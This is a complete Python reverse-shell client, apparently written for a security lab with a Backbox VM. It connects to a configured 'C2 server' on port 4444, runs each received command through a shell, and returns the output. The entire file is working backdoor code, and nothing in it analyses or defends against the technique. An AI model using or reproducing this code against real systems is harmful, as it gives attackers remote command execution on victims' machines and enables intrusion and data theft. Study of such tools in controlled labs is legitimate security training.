#!/usr/bin/env python3

import socket
import subprocess
import os

# --- Configuration ---
SERVER_IP = "192.168.43.100"  # Change this to the Backbox VM IP
SERVER_PORT = 4444            # Change to match the listener port

def connect_to_server():
    """Establish connection to the C2 server."""
    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((SERVER_IP, SERVER_PORT))
        print(f"[*] Connected to C2 server at {SERVER_IP}:{SERVER_PORT}")
        return client
    except Exception as e:
        print(f"[!] Connection failed: {e}")
        return None

def execute_command(command):
    """Execute a shell command and return the output."""
    try:
        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        stdout, stderr = process.communicate()
        return stdout + stderr
    except Exception as e:
        return f"[!] Command execution failed: {e}".encode()

def main():
    client = connect_to_server()
    if not client:
        return

    try:
        while True:
            command = client.recv(1024).decode().strip()
            if command.lower() == 'exit':
                break
            elif command:
                output = execute_command(command)
                client.send(output if output else b"[+] Command executed with no output.\n")
    except Exception as e:
        print(f"[!] Error: {e}")
    finally:
        client.close()

if __name__ == "__main__":
    main()
